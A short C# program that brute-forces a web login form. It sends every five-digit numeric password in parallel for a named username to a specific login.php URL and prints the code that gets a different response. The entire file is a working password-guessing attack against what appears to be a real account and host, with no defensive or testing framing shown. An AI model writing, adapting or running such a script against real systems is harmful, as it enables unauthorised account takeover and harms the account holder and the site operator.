using System;
using System.Collections.Specialized;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace segerg
{
    class Program
    {
        static void Main(string[] args)
        {
            string url = "http://2603482-0.web-hosting.es/web/login.php";
            Parallel.For(00000, 99999, (i) =>
            {
                try
                {
                    string num = i.ToString().PadLeft(5, '0');
                    using (var wb = new WebClient())
                    {
                        var data = new NameValueCollection();
                        data["usern"] = "roger.torrell";
                        data["passw"] = $"{num}";

                        var response = wb.UploadValues(url, "POST", data);
                        string responseInString = Encoding.UTF8.GetString(response);

                        Console.WriteLine(num);
                        if (!responseInString.Contains("no"))
                        {
                            Console.WriteLine("Encontrado!" + num);
                        }
                    }
                }
                catch (Exception)
                {
                    Console.WriteLine("Algo ha ido mal");
                }
            });
        }
    }
}